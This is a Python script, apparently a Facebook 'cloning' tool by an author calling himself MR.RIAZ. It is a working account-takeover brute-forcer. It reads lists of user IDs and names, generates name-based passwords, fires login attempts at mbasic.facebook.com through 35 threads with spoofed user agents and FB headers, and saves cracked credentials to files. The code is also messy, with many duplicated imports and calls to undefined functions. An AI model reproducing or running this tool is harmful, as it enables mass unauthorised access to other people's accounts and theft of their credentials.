#coding=utf-8
#!/usr/bin/python3
"""
hello friends kese ho this is mr.riaz
to i hope ap sab thik honge 
ajkal facebook ke sc ke ander method change krne ki zrorat ni
q ke en 3 mounth se facebook ke ander m.basic chalta hai
like facrbook ke all method again working bas 1 kam krna phrta hai
Fresh user ugent kahi se dhondo or eske userugent change krlo
then uske bad sc full lush hoga.
agar kisi ko userugent ni milte muj se contact krlo mai deta hon
Facebook acount name :- M R Riaz
thanks :- allah hafiz
"""
#new userugrnt u can use this-----#
"""
Dalvik/2.1.0 (Linux; U; Android 11; SGP321 Build/RQ3A.210805.019)

  Dalvik/2.1.0 (Linux; U; Android 13; SGP321 Build/TD1A.220804.021)

  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ1B.191205.042)

  Dalvik/2.1.0 (Linux; U; Android 13; SGP321 Build/TD1A.220804.039)

  Dalvik/2.1.0 (Linux; U; Android 12; SGP321 Build/SQ3A.220705.018)

  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ2A.200501.007)

  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QP1A.190711.044)

  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ1A.200105.047)

  Dalvik/2.1.0 (Linux; U; Android 11; SGP321 Build/RP1A.201005.003)

  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QD4A.200805.014)
"""
#-----
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
from random import randint
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from datetime import date
from datetime import datetime
from urllib.parse import quote
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess
from random import randint
import requests, re, os, time
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ADIabba
from concurrent.futures import ThreadPoolExecutor as Adiabba
from datetime import datetime
from bs4 import BeautifulSoup
from multiprocessing.pool import ThreadPool
import platform,base64
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from concurrent.futures import ThreadPoolExecutor

try:
    import requests
except ImportError:
    print('\n [âœ“] installing requests !...\n')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print('\n [âœ“] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [âœ“] installing bs4 !...\n')
    os.system('pip install bs4')
if not os.path.isfile('.agents.txt'):
    os.system('curl -L https://raw.githubusercontent.com/RIAZ-143/files/main/.agents.txt > .agents.txt')
ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
if not os.path.isfile('/sdcard/Download/python_13.1'):
    n = random. randint(11111,99999);x = open('/sdcard/Download/python_13.1', 'a');x.write(str(n));x.close()
with open(".agents.txt") as funk:
    liners = funk.readlines()


ok = []
cp = []
id = []
user = []
num = 0
loop = 0
_silet_koceng_  = requests.Session()
url_mb = "https://mbasic.facebook.com"
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan_key = {"january": "January", "february": "February", "march": "March", "april": "April", "may": "May", "june": "June", "july": "July", "august": "August", "september": "September", "october": "October", "november": "November", "december": "December"}
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
P = '\x1b[1;97m' # PUTIH
M = '\033[0;91m' # MERAH 
H = '\033[1;92m' # HIJAU 
K = '\033[1;91m' # KUNING 
B = '\033[0;94m' # BIRU 
U = '\033[0;95m' # UNGU 
O = '\033[0;96m' # BIRU MUDA
N = '\033[0m'    # WARNA MATI 
from concurrent.futures import ThreadPoolExecutor as QADIRMahar
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;97m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False
###
birth = ['001', '02', '03', '04', '05', '06', '07', '08', '09', '10', '11', '12', '13', '14', '15', '16', '17', '18', '19', '20', '21']
bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/uk_UA;FBAV/314.0.0.18.108;]','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
import os

try:
    import requests
except ImportError:
    print('\n [×] requests module not installed!...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [×] Futures module not installed!...\n')
    os.system('pip install futures')
    
try:
    import bs4
except ImportError:
    print('\n [×] Bs4 module not installed!...\n')
    os.system('pip install bs4')
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://x.facebook.com"
url_ip = "https://www.httpbin.org/ip"
url_graph = "https://graph.facebook.com/{}"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ugen=[]
for x in range(10000):
    aa='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def clear():
	os.system('clear')
	print(logo)
	#
def menu():
	clear()
	print('[1] File Cloning Auto  Pass  ')
	print('[2] File Cloning Choice Pass ')
	print('[3] Random number Cloning')
	print('[4] File Create ')
	print('[5] Exit')
	linex()
	riaz=input('[•] Select Option :')
	if riaz =='1':
		__crack__().plerr()
	if riaz =='2':
		file()
	if riaz =='3':
		mrriaz()
	if riaz =='4':
		print('[•] For this scrpit contact with me');exit()
	else:
		print('[•] Select Right Option ');menu()

def logo():
    print(logo)
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print('\033[1;96m The Prosess Done Is Completed')
        print('\n\033[1;92mTotal OK : %s \n \033[1;95m Total CP : %s'%(str(len(ok)),str(len(cp))));input(' Press Enter To Go Back ');main()
        #print('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
    else:
        print('\n\033[0mYour Ip Is Blocked Or Blacklist Restart Your Mobile ')
        exit()
        
class __crack__:
    def __init__(self):
        self.id = []
    def plerr(self):
        os.system("clear");print(logo)
        
        try:
            self.apk = input("\033[1;37m File Path : ")
            print ('')
            self.id = open(self.apk).read().splitlines()
        except:
            print('\n \033[1;37m[!] \033[1;31mFile Not Found In Storage')
            input('\n\033[1;37m[*] \033[1;36mPress Enter To Back');version()
        self.__pler__()
    def __mbasic__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\r\033[1;37m [PRO-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            except: pass
            try:
                Adiagents = random.choice(liners)
            except (KeyError, IOError):
                Adiagents  = 'Mozilla/5.0 (Linux; Android 10; linux Build/QD1A.190821.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4213.65 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/386.0.0.13.96;]'
            ses = requests.Session()
            headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2861.97 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
            dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
            _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2707.112 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
            po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;32m [PRO-OK]\033[1;32m %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('PRO-OK.txt','a').write('%s\n' % wrt)
                break
            elif 'checkpoint' in ses.cookies.get_dict():
                print('\r\033[1;31m [PRO-CP]\033[1;31m %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('PRO-CP.txt','a').write('%s\n' % wrt)
                break
            else:
                continue
        loop += 1
    def __pler__(self):
        os.system("clear")
        print(logo)
        print ("\033[1;37m [1] Method [1] ")
        linex()
        yan = input('\033[1;37m[+] \033[1;36mCHOOSE OPTION \033[1;31m: \033[1;32m')
        if yan == '':
            print('\Choose Error ')
            exit()
        elif yan in ('1', '01'):
            
            os.system("clear")
            print(logo)
            time.sleep(1)
            
            print('[•] Total Ids : %s ' % len(self.id))
            print('\x1b[1;91m[•] If you no result use flight mode')
            linex()
            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('|')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                        elif len(xz) == 2:
                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                        elif len(xz) == 3:
                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                        elif len(xz) == 4:
                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"1234", xz[0]+"786", xz[0]+"12345", xz[0]+"@123", xz[0]+"1122",name, xz[0]+"1234"]
                        _ngentot_gratis_.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass
            os.remove(self.apk)
            hasil(ok,cp)
        else:
            print('\n××××')
            time.sleep(1)
            self.__pler__()
            

            
    

logo="""
       ########  ########   #######  
      \x1b[1;91m ##     ## ##     ## ##     ## 
      \x1b[1;91m ##     ## ##     ## ##     ## 
       \x1b[1;95m########  ########  ##     ## 
       \x1b[1;95m##        ##   ##   ##     ## 
       \x1b[1;97m##        ##    ##  ##     ## 
       ##        ##     ##  #######
\33[1;37m----------------------------------------------
→   Owner      :  MR.RIAZ
→   Facebook   :  M R RIAZ
→   Github     :  RIAZ-143
→   Tool Type  :  \x1b[1;91mOPEN SURCE
\x1b[1;97m→   Version    :  0.2
\33[1;37m----------------------------------------------"""
def linex():
	print('\33[1;37m----------------------------------------------')
ct = datetime.now()
n = ct.month
monthsx = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"]
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
urls="https://business.facebook.com/business_locations"
_ses=requests.Session()

#
import os

try:

	import requests

except ImportError:

	print('\n [×] Modul requests belum terinstall!...\n')

	os.system('pip install requests')

try:

	import concurrent.futures 

except ImportError:

	print('\n [×] Modul Futures belum terinstall!...\n')

	os.system('pip install futures')

try:

	import bs4
	

except ImportError:

	print('\n [×] Modul Bs4 belum terinstall!...\n')

	os.system('pip install bs4')

import requests, os, re, bs4, sys, uuid, json, time, random, datetime, subprocess

from concurrent.futures import ThreadPoolExecutor as YayanGanteng

from datetime import datetime

from bs4 import BeautifulSoup

ct = datetime.now()

n = ct.month

bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']

try:

	if n < 0 or n > 12:

		exit()

	nTemp = n - 1

except ValueError:

	exit()

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

op = bulan[nTemp]

waktu = '%s %s %s'%(ha,op,ta)

waktu.split('/')

### WARNA RANDOM ###

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'	# WARNA MATI

A = '\x1b[1;90m' # WARNA ABU ABU

BN = '\x1b[1;107m' # BELAKANG PUTIH

BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT

BP = '\x1b[1;105m' # BELAKANG PINK

BB = '\x1b[1;104m' # BELAKANG BIRU

BK = '\x1b[1;103m' # BELAKANG KUNING

BH = '\x1b[1;102m' # BELAKANG HIJAU

BM = '\x1b[1;101m' # BELAJANG MERAH

BA = '\x1b[1;100m' # BELAKANG ABU ABU

my_color = [

 P, M, H, K, B, U, O, N]

warna = random.choice(my_color)
random5 ="[•] You Can Do It Vro :)"
############################ RESPONSE FACEBOOK ###########################################

data,data2={},{}

aman,cp,salah=0,0,0

ubahP,pwBaru=[],[]

Apk = []

ok = []

cp = []

id = []

user = []

loop = 0

import os,sys,time,json,random,re,string,platform,base64
try:
	import requests
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
	import mechanize
	from requests.exceptions import ConnectionError
except ModuleNotFoundError:
	os.system('pip install mechanize requests futures==2 > /dev/null')
	os.system('python random.py')
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
url_lookup = "https://lookup-id.com/"

url_mb = "https://x.facebook.com"

url_ip = "https://www.httpbin.org/ip"

url_graph = "https://graph.facebook.com/{}"

header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}

bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']

#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']

###########################################################################################

hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"

dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"

aaaa, bbbb, cccc = "tools", "debug", "accesstoken"

#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"

bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"

###########################################################################################

## RANDOM UA

#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']

uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"

uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"

uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"

uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"

uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"

uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"

uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"

#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"

#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"

uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"

uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])

uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"

uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"

uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])

